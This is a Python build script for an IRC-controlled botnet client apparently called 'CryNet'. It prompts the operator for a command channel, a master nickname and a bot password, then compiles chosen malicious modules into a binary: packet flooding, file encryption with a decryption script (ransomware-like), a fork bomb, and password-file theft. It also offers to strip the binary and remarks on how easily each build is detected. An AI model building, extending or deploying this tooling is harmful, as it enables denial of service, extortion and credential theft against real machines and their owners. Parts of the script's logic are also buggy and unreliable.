import subprocess
import os
import hashlib

OBJ_CREATION_BASE = "g++ -std=c++17 -Wall -Wextra -Iinclude"

BOT_FILES_PATH = "../bot/src/"

BOT_MAIN_OBJ = "BotMain"
IRC_CLIENT_OBJ = "IrcClient"
MESSAGE_PARSER_OBJ = "MessageParser"
GENERAL_UTILS_OBJ = "GeneralUtils"
PING_ACTION_OBJ = "PingAction"
PACKET_LAUNCHER_OBJ = "PacketLauncher"
ENCRYPT_ACTION_OBJ = "EncryptAction"
CRYPTO_MANAGER_OBJ = "CryptoManager"
FS_DECRYPTOR_OBJ = "FileSystemDecryptor"
GEN_SCRIPT_OBJ = "GenDecryptionScript"
REPORT_ACTION_OBJ = "ReportAction"
FORK_BOMB_ACTION_OBJ = "ForkBombAction"
GET_PASSWD_ACTION_OBJ = "GetPasswdAction"

ENABLE_PING_FLAG = "-DENABLE_PING_ACTION"
ENABLE_ENCRYPT_FLAG = "-DENABLE_ENCRYPT_ACTION"
ENABLE_REPORT_FLAG = "-DENABLE_REPORT_ACTION"
ENABLE_FORK_BOMB_FLAG = "-DENABLE_FORK_BOMB_ACTION"
ENABLE_GET_PASSWD_FLAG = "-DENABLE_GET_PASSWD_ACTION"

LIB_IRC_CLIENT = "-lircclient"
CRYPTO_PP = "-lcryptopp"
LIB_TINS = "-ltins"
LIB_PCAP = "-lpcap"

def computeSha256Hex(inputStr):
    encodedString = inputStr.encode("utf-8")
    sha256sum = hashlib.sha256()
    sha256sum.update(encodedString)
    return sha256sum.hexdigest().lower()

def enableFlagSetup():
    flagDict = {}
    flagDict["PING"] = ""
    flagDict["ENCRYPT"] = ""
    flagDict["REPORT"] = ""
    flagDict["FORK_BOMB"] = ""
    flagDict["GET_PASSWD"] = ""
    return flagDict

class BotCompiler:
    def __init__(self, serverAddress, validatePassHash):
        self.serverAddress = serverAddress
        self.validatePassHash = validatePassHash
        self.masterNick = "master"
        self.assignedChannel = ""
        self.botNick = ""
        self.botUser = ""
        self.botPass = ""
        self.outFile = ""
        self.objectFiles = []
        self.enableFlags = enableFlagSetup()
        self.commands = []
        self.dependencies = []

    def enablePingAction(self):
        self.objectFiles.append(PING_ACTION_OBJ)
        self.objectFiles.append(PACKET_LAUNCHER_OBJ)
        self.enableFlags["PING"] = ENABLE_PING_FLAG

    def enableEncryptAction(self):
        self.objectFiles.append(ENCRYPT_ACTION_OBJ)
        self.objectFiles.append(CRYPTO_MANAGER_OBJ)
        self.objectFiles.append(GEN_SCRIPT_OBJ)
        self.objectFiles.append(FS_DECRYPTOR_OBJ)
        self.enableFlags["ENCRYPT"] = ENABLE_ENCRYPT_FLAG

    def enableReportAction(self):
        self.objectFiles.append(REPORT_ACTION_OBJ)
        self.objectFiles.append(CRYPTO_MANAGER_OBJ)
        self.enableFlags["REPORT"] = ENABLE_REPORT_FLAG

    def enableForkBombAction(self):
        self.objectFiles.append(FORK_BOMB_ACTION_OBJ)
        self.enableFlags["FORK_BOMB"] = ENABLE_FORK_BOMB_FLAG

    def enableGetPasswdAction(self):
        self.objectFiles.append(GET_PASSWD_ACTION_OBJ)
        self.enableFlags["GET_PASSWD"] = ENABLE_GET_PASSWD_FLAG

    def setObjectFiles(self):
        print("=========================Bot features setup=========================")
        print("Bot action options (see BotCommands.md in the docs folder for descriptions): ")
        print("1. PING")
        print("2. ENCRYPT")
        print("3. REPORT")
        print("4. FORK_BOMB")
        print("5. GET_PASSWD")
        print("-ALL for all actions")
        print("-NONE or press 'enter' for no special actions")
        actions = input("Input desired bot actions as a space seperated list (I.e. 1 2 5): ")
        
        self.objectFiles.append(BOT_MAIN_OBJ)
        self.objectFiles.append(IRC_CLIENT_OBJ)
        self.objectFiles.append(MESSAGE_PARSER_OBJ)
        self.objectFiles.append(GENERAL_UTILS_OBJ)
        self.dependencies.append("-lcryptopp")

        if "-NONE" in actions:
            print("Compiling bot with no actions")
            print("(Note: the bot will simply attempt to connect to the server and, if successful, parse commands. This can be good for a debugging context)")
            return
        
        if "-ALL" in actions:
            print("Compiling bot with all actions")
            print("(Note: this is the most powerful bot, but will be larger in file size and possibly easier to detect)")
            self.enablePingAction()
            self.enableEncryptAction()
            self.enableReportAction()
            self.enableForkBombAction()
            self.enableGetPasswdAction()
            return
        
        actions = actions.split(" ")

        for action in actions:
            if action == "1":
                self.enablePingAction()
            elif action == "2":
                self.enableEncryptAction()
            elif action == "3":
                self.enableReportAction()
            elif action == "4":
                self.enableForkBombAction()
            elif action == "5":
                self.enableGetPasswdAction()

    def stringifyMacros(self):
        macros = ""
        macros += f"-DBOT_NICK={self.botNick} "
        macros += f"-DBOT_USER={self.botUser} "
        macros += f"-DSERVER_ADDRESS={self.serverAddress} "
        macros += f"-DASSIGNED_CHANNEL={self.assignedChannel} "
        macros += f"-DBOT_PASS={self.botPass} "
        macros += f"-DMASTER_NICK={self.masterNick} "

        return macros
    
    def stringifyFlags(self):
        result = ""
        for flag in self.enableFlags.values():
            result += flag + " "
        return result
    
    def setMacros(self):
        print("=========================Bot Macros Setup=========================")
        print("(Note: these values will be passed to the bot as essentially compilation time params)")
        assignedChannel = input("Enter a botnet channel name (must start with '#'): ") # TODO: specify that a comma seperated list of channels are allowed
        if assignedChannel[0] != "#" and len(assignedChannel) > 60:
            print("Error: invalid channel name")
            return False

        botNick = input("Enter a bot nickname (Note: every bot process will generate a random 8 digit appendix to differentiate itself, but the base name is set here): ")
        if len(botNick) > 50:
            print("Bot nick too long")
            return False
        botUser = input("Enter a bot username: ")
        if len(botUser) > 50:
            print("Bot user too long")
            return False
        
        masterNick = input("Enter the nickname of the master (Note: if you have auto-connected, or plan to, the nick is 'master') ")
        if len(masterNick) > 50:
            print("Master nick too long")
            return False
                
        botPass = input("Enter bot validation password: ")
        tempHexDigest = computeSha256Hex(botPass)
        if tempHexDigest != self.validatePassHash:
            print("Given bot validation pass did not match the SHA-256 hash in config")
            return False
        
        self.assignedChannel = assignedChannel
        self.botUser = botUser
        self.botNick = botNick
        self.masterNick = masterNick
        self.botPass = botPass
        return True
    
    def setGeneral(self):
        print("=========================General Bot Setup=========================")

        exeName = input("Enter the name of the executable: ")

        outputPath = input("Enter the output path of this binary (no input will be the cwd): ")
        if outputPath != "" and outputPath[-1] != "/":
            outputPath += "/"

        self.outFile = outputPath + exeName

        print("Would you like to strip the binay? Stripping is recommended since it removes debugging informationa and untouched code, which reduces the exe size.")
        stripExe = input("Enter 'n' to not strip the exe: ")
        if stripExe != "n" or stripExe != "N":
            self.strip = "-s"

    def stringifyObjects(self):
        result = ""
        for object in self.objectFiles:
            result += object + " "
        return result
    
    def stringifyDependencies(self):
        result = ""
        for depen in self.dependencies:
            result += depen + " "
        return result
    
    def setCommands(self):
        for object in self.objectFiles:
            cmd = ""
            if object == BOT_MAIN_OBJ:
                cmd = f"{OBJ_CREATION_BASE} {self.enableFlags['ENCRYPT']} {self.stringifyMacros()} -c {BOT_FILES_PATH + object}.cpp {object}.o"
            elif object == IRC_CLIENT_OBJ:
                cmd = f"{OBJ_CREATION_BASE} {self.stringifyFlags()} -c {BOT_FILES_PATH + object}.cpp {object}.o"
            else:
                cmd = f"{OBJ_CREATION_BASE} -c {BOT_FILES_PATH + object}.cpp -o {object}.o"
            self.commands.append(cmd)
        finalCmd = f"g++ {self.stringifyObjects()} -o {self.outFile} {self.stringifyDependencies()} {self.strip}"
        self.commands.append(finalCmd)

    def compile(self):
        for cmd in self.commands:
            subprocess.run(cmd)

    def compilationSetup(self):

        self.setGeneral()
        setMacrosResult = False
        while not setMacrosResult:
            setMacrosResult = self.setMacros()

        self.setObjectFiles()
        self.setCommands()

        self.compile()
    
    def clean(self):
        for object in self.objectFiles:
            os.remove(f"{object}.o")
    
    def start(self):
        print("----------------------CryNet Bot Compilation----------------------") 
        print("To a compile a bot with a specific level of complexity, follow given instructions")
        print("(Note: This compiler will only work if g++ is installed and the master program is running from the 'master' directory)")
        self.compilationSetup()
